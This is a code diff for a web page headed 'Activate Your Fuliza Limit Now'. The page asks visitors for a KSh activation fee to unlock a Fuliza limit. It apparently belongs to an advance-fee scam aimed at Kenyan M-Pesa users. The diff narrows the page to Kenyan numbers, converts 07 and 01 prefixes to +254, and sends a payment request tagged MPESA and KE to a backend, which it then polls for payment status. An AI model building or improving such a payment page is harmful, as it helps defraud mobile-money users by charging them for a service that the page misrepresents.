@@ -27,13 +27,14 @@ input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radiu
 <h2>Activate Your Fuliza Limit Now</h2>
 
 <p class="encourage">
-Pay your activation fee today to unlock your desired Fuliza limit instantly.
+Pay your activation fee today to unlock your desired Fuliza limit instantly.  
+Only Kenyan numbers are accepted for this payment. Numbers starting with <b>07</b> or <b>01</b> will be automatically converted to <b>+254</b>.
 </p>
 
 <div class="info">Selected Limit: <strong id="limit"></strong></div>
 <div class="info">Activation Fee: <strong id="fee"></strong></div>
 
-<input type="tel" id="phone" placeholder="Enter your phone number starting with country code (+254, +256, +255, +260)">
+<input type="tel" id="phone" placeholder="Enter your Kenyan phone number (+2547xxxxxxx)">
 
 <button class="pay-btn" onclick="payNow()">Pay Activation Fee Now</button>
 
@@ -52,53 +53,31 @@ const activationFee = localStorage.getItem("activationFee") || 50;
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 document.getElementById("fee").innerText = "KSh " + activationFee;
 
-// Country codes mapping
-const countryPrefixes = { '254': 'KE', '256': 'UG', '255': 'TZ', '260': 'ZM' };
-const defaultNetwork = { 'KE': 'MPESA', 'UG': 'MTN', 'TZ': 'TIGO', 'ZM': 'ZAMTEL' };
+// Only Kenya supported
+const defaultNetwork = 'MPESA';
 
-// Normalize phone and detect country
+// Convert number to +254 if needed
 function normalizePhone(input){
   let phone = input.trim();
-  let country = null;
-
-  if(phone.startsWith('+')){
-    const prefix = phone.substring(1,4);
-    country = countryPrefixes[prefix];
-    phone = phone.substring(1); // Remove +
-  } else if(phone.startsWith('07') || phone.startsWith('01')){
-    // Automatically convert to Kenya
-    country = 'KE';
-    phone = '254' + phone.substring(1);
-  } else {
-    const prefix = phone.substring(0,3);
-    country = countryPrefixes[prefix];
-  }
-
-  return { phone, country };
+  if(phone.startsWith('+254')) return phone; // Already in correct format
+  if(phone.startsWith('07') || phone.startsWith('01')) return '+254' + phone.substring(1);
+  if(phone.startsWith('254')) return '+' + phone;
+  return null; // Invalid number
 }
 
-// Disable button while processing
 function setButtonState(enabled){
   document.querySelector(".pay-btn").disabled = !enabled;
 }
 
-// Initiate payment
 async function payNow(){
   const phoneInput = document.getElementById("phone").value;
   const msg = document.getElementById("message");
   const spinner = document.getElementById("spinner");
 
   msg.innerText = "";
-  if(!phoneInput){
-    msg.innerText = "Enter your phone number";
-    msg.style.color = "red";
-    return;
-  }
-
-  const { phone: phoneToSend, country } = normalizePhone(phoneInput);
-
-  if(!country){
-    msg.innerText = "Invalid phone number. Must start with +254, 254, +256, 256, +255, 255, +260, or 260.";
+  const phoneToSend = normalizePhone(phoneInput);
+  if(!phoneToSend){
+    msg.innerText = "Invalid Kenyan number. Use 07xxxxxxxx or +2547xxxxxxxx format.";
     msg.style.color = "red";
     return;
   }
@@ -115,8 +94,8 @@ async function payNow(){
       body: JSON.stringify({
         phone_number: phoneToSend,
         amount: Number(activationFee),
-        country,
-        network: defaultNetwork[country]
+        country: 'KE',
+        network: defaultNetwork
       })
     });
     const data = await res.json();
@@ -139,13 +118,12 @@ async function payNow(){
   }
 }
 
-// Poll payment status
 async function checkPayment(reference, nextPage){
   const msg = document.getElementById("message");
   let attempts = 0;
   const interval = setInterval(async ()=>{
     attempts++;
-    if(attempts > 80){ // 4 minutes timeout
+    if(attempts > 80){
       clearInterval(interval);
       msg.innerText="Payment timeout. Please retry.";
       msg.style.color="red";
